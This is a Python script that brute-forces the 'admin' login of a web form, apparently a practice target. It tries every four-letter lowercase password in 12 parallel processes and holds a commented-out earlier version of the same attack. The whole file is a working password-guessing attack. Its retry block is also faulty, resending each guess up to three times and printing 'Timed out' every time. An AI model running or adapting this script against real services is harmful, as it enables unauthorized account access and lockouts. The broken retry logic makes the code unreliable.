import requests
import time
from requests.exceptions import ConnectTimeout
import multiprocessing as mp
from requests.adapters import HTTPAdapter
from urllib3.util import Retry
url = 'https://dudo.gvpt.sk/bruteforce/account/login'
count = 12
chars = 'abcdefghijklmnopqrstuvwxyz'
login = 'admin'
all_passwords = [a+b+c+d for a in chars for b in chars for c in chars for d in chars]

# final = []
# def crack1():
#     if len(final)!=0:
#         return True
#     passwords1 = [a+b+c+d for a in chars for b in chars for c in chars for d in chars]
#     passwords1 = passwords1[0:len(passwords1)//3:]
#     for password1 in passwords1:
#         res = requests.post(url,data={'username':'admin','password':password1,'action':'submit'})
#         if res.url != 'https://dudo.gvpt.sk/bruteforce/account/login':
#             print(f'Broken: {password1}')
#             final.append(password1)
#             return True
#         else:
#             print(f'Nope {password1}')
# def crack2():
#     if len(final)!=0:
#         return True
#     passwords2 = [a+b+c+d for a in chars for b in chars for c in chars for d in chars]
#     passwords2 = passwords2[len(passwords2)//3:(len(passwords2)//3)*2:]
#     for password2 in passwords2:
#         res = requests.post(url,data={'username':'admin','password':password2,'action':'submit'})
#         if res.url != 'https://dudo.gvpt.sk/bruteforce/account/login':
#             print(f'Broken: {password2}')
#             final.append(password2)
#             return True
#         else:
#             print(f'Nope {password2}')
# def crack3():
#     if len(final) !=0:
#         return True
#     passwords3 = [a+b+c+d for a in chars for b in chars for c in chars for d in chars]
#     passwords3 = (passwords3[(len(passwords3)//3)*2::])
#     for password3 in passwords3:
#         res = requests.post(url,data={'username':'admin','password':password3,'action':'submit'})
#         if res.url != 'https://dudo.gvpt.sk/bruteforce/account/login':
#             print(f'Broken: {password3}')
#             final.append(password3)
#             return True
#         else:
#             print(f'Nope {password3}')

# if __name__ == '__main__':    
#     proc1 = multiprocessing.Process(target=crack1)
#     proc2 = multiprocessing.Process(target=crack2)
#     proc3 = multiprocessing.Process(target=crack3)
#     proc1.start()
#     proc2.start()
#     proc3.start()

#     proc1.join()
#     proc2.join()
#     proc3.join()
def requesting(i,passwords,foundit,ret_list):
    s = requests.session()
    certain = s.post(url,data={'username':'admin','password':'a','action':''})
    certain = certain.text
    start = ((len(passwords)//count) * (i))
    end = (len(passwords)//count) * (i+1)
    for password in passwords[start:end:]:
        if not foundit.is_set():
            try:
                idk = s.post(url,data={'username':'admin','password':password,'action':''})
            except ConnectTimeout:
                print(f'Timed out {i}')
                time.sleep(5)
                idk = s.post(url,data={'username':'admin','password':password,'action':''})
            else:
                print(f'Timed out {i}')
                time.sleep(10)
                idk = s.post(url,data={'username':'admin','password':password,'action':''})
            finally:
                print(f'Timed out {i}')
                time.sleep(20)
                idk = s.post(url,data={'username':'admin','password':password,'action':''})
            if idk.text != certain:
                ret_list.append(password)
                foundit.set()
                print(f'found password {password} {idk}')
                break
            if passwords.index(password)%100==0:
                print(f'3000 {i}')
                time.sleep(1)
    print('finished')

chars = 'abcdefghijklmnopqrstuvwxyz'


pool = []

if __name__ =='__main__':
    foundit = mp.Event()
    manager = mp.Manager()
    ret_list = manager.list()
    for i in range(count):
        pool.append(mp.Process(target= requesting, args = (i,all_passwords,foundit,ret_list)))
    for p in pool:
        p.start()
    foundit.wait()
    for p in pool:
        p.terminate()
    for p in pool:
        p.join()

    print(ret_list)
    print('all joined')
    

    






